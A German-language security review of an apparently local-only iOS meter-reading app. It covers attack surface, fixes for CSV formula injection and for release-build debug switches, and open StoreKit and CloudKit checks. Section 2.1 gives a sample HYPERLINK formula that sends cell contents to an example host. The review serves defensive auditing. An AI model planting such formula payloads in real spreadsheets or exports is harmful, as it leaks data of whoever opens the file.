# 11 – Sicherheit: was angreifbar wäre und was nicht

Stand: 2026-08-15, Version 0.47.0

Durchsuchte Fläche: `App/`, `Widget/`, `Shared/`, `Packages/PulseCore`,
`Packages/PulseData`, `Packages/PulseUI`, `project.yml`, `App/Info.plist`,
`.github/workflows/`.

> **Was diese Prüfung ist und was nicht.** Sie ist gelesener Quelltext und
> gezielte Suche — keine Untersuchung eines laufenden Programms und kein
> Angriffsversuch. Was erst am Gerät sichtbar wird (Schlüsselbund-Verhalten,
> StoreKit-Belege, CloudKit-Rechte), steht in Abschnitt 5 als **offen**, nicht
> als geprüft.

---

## 1. Warum die Fläche so klein ist

Die meisten Sicherheitslücken einer App entstehen dort, wo sie mit der Welt
spricht. PulseMeter spricht mit niemandem:

| Gesucht | Gefunden |
|---|---|
| `URLSession`, `URLRequest`, `http://`, `https://` in Programmcode | **keine** |
| Fremde Pakete in `Package.swift` | **keine** — nur die eigenen drei |
| `UIPasteboard` | **keine** |
| `print`, `NSLog`, `os_log`, `Logger` | **keine** |
| Eigene URL-Schemata (`CFBundleURLSchemes`) | **keine** |
| `NSAllowsArbitraryLoads` oder sonstige ATS-Ausnahmen | **keine** |
| Berechtigungstexte für Kamera, Ort, Kontakte, Fotos | **keine** |

Das ist kein Zufall, sondern ADR-002: keine Server, kein Konto, keine
Bibliotheken Dritter. **Was es nicht gibt, kann nicht falsch konfiguriert
werden.** Der letzte Punkt ist zusätzlich ein Ablehnungsgrund weniger: Eine
App, die eine Berechtigung erbittet und nicht braucht, fällt bei der Prüfung
auf.

Ohne fremde Pakete gibt es außerdem keine Lieferkette, die vergiftet werden
kann — kein `npm audit`, kein `Dependabot`, nichts, was nachts ein
Sicherheitsupdate braucht.

---

## 2. Was behoben wurde

### 2.1 Ein Zählername konnte in einer Tabelle zur Formel werden

**Der Fall.** Der CSV-Export fasste Felder korrekt ein (RFC 4180), neutralisierte
aber keine Formelzeichen. Ein Zähler namens

```
=HYPERLINK("http://beispiel.de/"&A2;"Klick")
```

steht in der Datei als Text. Beim Öffnen in Excel, Numbers oder LibreOffice
wird daraus eine **Formel, die beim bloßen Ansehen der Tabelle läuft** — sie
kann Zellinhalte nach außen tragen oder zum Anklicken verleiten. Einfassen
allein hilft nicht: Auch `"=1+1"` wird ausgewertet.

**Warum es trotzdem zählt, obwohl der Nutzer seine Namen selbst tippt.** Der
Export ist zum **Weitergeben** gemacht — an den Vermieter, den Mieter, die
Steuerberatung. Sobald jemand anderes die Datei öffnet, ist der Name für ihn
fremde Eingabe. Für die Vermieter-Fassung (`04-monetarisierung.md`) gilt das
doppelt: Dort tippt der eine, und der andere öffnet.

**Behoben in 0.47.0.** Beginnt ein Textfeld mit `=`, `+`, `-`, `@`, Tabulator
oder Wagenrücklauf, steht ein Apostroph davor — das Zeichen, mit dem
Tabellenkalkulationen seit jeher „das ist Text" meinen. Zahlen und Daten sind
davon nicht betroffen: `escape` sieht nur Namen, Bezeichnungen und Einheiten.
Zwei Tests halten beides fest, auch dass ein gewöhnliches „Strom" unangetastet
bleibt.

Einstufung: **niedrig** heute, **mittel** ab der Vermieter-Fassung.

### 2.2 Startschalter lagen im ausgelieferten Programm

**Der Fall.** An neun Stellen stand `ProcessInfo.processInfo.arguments
.contains("-pulse-…")`. Zwei dieser Schalter sind scharf: `-pulse-reset`
**löscht alle Ablesungen**, `-pulse-pro` schaltet **jeden Kauf** frei. Sie
waren in jeder Konfiguration übersetzt, auch in der, die im Store landen würde.

**Wie groß die Gefahr wirklich war: gering.** Startargumente lassen sich auf
einem gewöhnlichen iPhone nicht von außen setzen — dafür braucht es Xcode am
Kabel oder ein aufgebrochenes Gerät. Es war keine offene Tür, sondern eine Tür
ohne Grund. Genau die Art Kleinigkeit, die zwei Jahre später jemand findet,
wenn niemand mehr weiß, wofür sie da war.

**Behoben in 0.47.0.** Alle Abfragen laufen über `App/Startschalter.swift`, das
im `Release`-Bau `false` zurückgibt; der Übersetzer wirft die Zweige dahinter
weg. Geprüft und fotografiert wird ausschließlich mit `Debug` — weder
`scripts/` noch `ci.yml` setzen eine andere Konfiguration.

Einstufung: **niedrig**, und jetzt weg.

---

## 3. Angesehen und für richtig befunden

**Wo die Daten liegen.** In der SwiftData-Ablage im App-Container. Kein Ordner
außerhalb, keine zweite Kopie, kein Zwischenspeicher.

**Der Schutz der Dateien.** Es ist nichts eingestellt, also gilt die
Voreinstellung von iOS: `CompleteUntilFirstUserAuthentication` — lesbar erst,
nachdem das Gerät nach dem Einschalten einmal entsperrt wurde. `Complete`
wäre strenger und **falsch**: Das Widget liest im gesperrten Zustand, und
Erinnerungen werden im Hintergrund geplant. Wer diese Voreinstellung ändert,
bekommt ein leeres Widget und stumme Erinnerungen. Bewusst so gelassen.

**Der Ordner fürs Widget.** `WidgetBridge` legt eine kleine JSON-Datei in die
App-Gruppe. Die teilen sich ausschließlich unsere eigenen zwei Ziele; ein
fremdes Programm kommt nicht hinein. Inhalt sind Zusammenfassungen, keine
Rohdaten. Und **es scheitert leise**: Fehlt die Gruppe, landet die Datei im
eigenen Ordner der App, und das Widget bleibt leer, statt dass etwas abstürzt.

**Die Exportdateien.** Sie entstehen unter `temporaryDirectory` — innerhalb der
Sandbox, für andere Apps unerreichbar. iOS räumt dort selbst auf. Der Name ist
vorhersagbar (`PulseMeter-Strom-Ablesungen.csv`), was nichts ausmacht, solange
niemand sonst in den Ordner sehen kann.

**Der gespeicherte Kaufzustand.** Er liegt in `UserDefaults` und ist
ausdrücklich **kein** Schutz, sondern ein Zwischenspeicher für die Oberfläche
(`App/Purchase.swift`). Das ist in Ordnung — solange die Regel aus Abschnitt 5
eingehalten wird.

**Die Plausibilitätsprüfung.** Sie schützt keine Daten, aber sie ist die
einzige Stelle, an der die App eine Eingabe ablehnt. Sie warnt und lässt
sichern — richtig so: Ein auffälliger Wert kann richtig sein, und eine App, die
den Menschen vor dem Zähler überstimmt, ist unbrauchbar.

---

## 4. Nicht anwendbar

Kein Anmeldeverfahren, keine Sitzungen, keine Kennwörter, keine Datenbank mit
Abfragesprache, kein Webinhalt in der App, keine Datei-Importe von außen, keine
Verschlüsselung in Eigenregie. Damit entfällt die Hälfte jeder üblichen
Prüfliste — nicht, weil es übersehen wurde, sondern weil es die Sache nicht
gibt.

---

## 5. Offen — erst mit dem Developer Program prüfbar

| Was | Worauf zu achten ist |
|---|---|
| **StoreKit** | Der Kaufzustand in `UserDefaults` darf **nie** die Wahrheit sein. Bei jedem Start ist `Transaction.currentEntitlements` zu lesen und der Zwischenspeicher daran anzugleichen — auch nach unten. Sonst genügt ein Häkchen auf dem Gerät. |
| **CloudKit** | Ausschließlich die **private** Datenbank. Eine öffentliche oder geteilte Datenbank würde aus „liegt bei dir" ein „liegt bei uns" machen und die Datenschutzerklärung zur Unwahrheit. |
| **`.entitlements`** | Nur zwei Einträge: App-Gruppe und iCloud. Jede weitere Berechtigung ist zu begründen oder zu streichen. |
| **`PrivacyInfo.xcprivacy`** | Muss zu Abschnitt 3 von `09-appstore.md` passen: keine erfassten Daten, kein Tracking. Ein Widerspruch zwischen Manifest und Fragebogen fällt bei der Prüfung auf. |
| **Gerätelauf** | Ein Blick in die Systemprotokolle, während Ablesungen eingetragen werden: Es darf kein Zählerstand auftauchen. Heute gibt es keine Protokollausgabe, aber SwiftData und StoreKit schreiben von sich aus. |

---

## 6. Wie diese Prüfung wiederholt wird

Ohne Wiederholung ist sie eine Momentaufnahme. Der billigste Teil läuft
deshalb bei jedem Lauf mit — `scripts/pruefen.sh` prüft über
`scripts/check-sicherheit.sh`, dass die Fläche klein bleibt:

- kein `URLSession`, kein `http://` im Programmcode,
- keine fremden Pakete in einer `Package.swift`,
- kein `print`/`NSLog` mit Nutzerdaten,
- kein Analyse-, Werbe- oder Absturzberichtsbaustein
  (`AppTrackingTransparency`, `AdSupport`, `SKAdNetwork`, Firebase, Sentry,
  Mixpanel, Amplitude, Bugsnag, Crashlytics, TelemetryDeck, PostHog),
- `cloudKitDatabase` nie `.public` oder `.shared` — nur die private Datenbank
  des Nutzers,
- kein direkter Zugriff auf `processInfo.arguments` außerhalb von
  `Startschalter.swift`,
- keine Berechtigungstexte in `Info.plist` für Dinge, die es nicht gibt.

**Die zwei letzten Zusagen sind seit 0.53.0 geprüft und nicht mehr nur wahr.**
Auf der Startseite steht „keine Werbung, keine Analyse, keine Absturzberichte"
und „deine eigene iCloud". Beides galt vorher nur, weil niemand die Zeile
geschrieben hatte, die es bricht — und beides sind Zeilen, die aus guten
Gründen geschrieben werden: Ein Absturzmelder ist nützlich, und `.public` ist
ein Wort Unterschied zu `.automatic`. Beide Prüfungen sind gegengeprüft worden,
indem der Verstoß absichtlich eingebaut wurde; beide haben angeschlagen.

Der Rest — die Punkte aus Abschnitt 5 — wird von Hand nachgeholt, sobald es
etwas zu prüfen gibt. Diese Datei bekommt dann eine neue Fassung, keine
Ergänzung: Eine Sicherheitsprüfung mit Datum ist etwas wert, eine mit
angeklebten Nachträgen nicht.
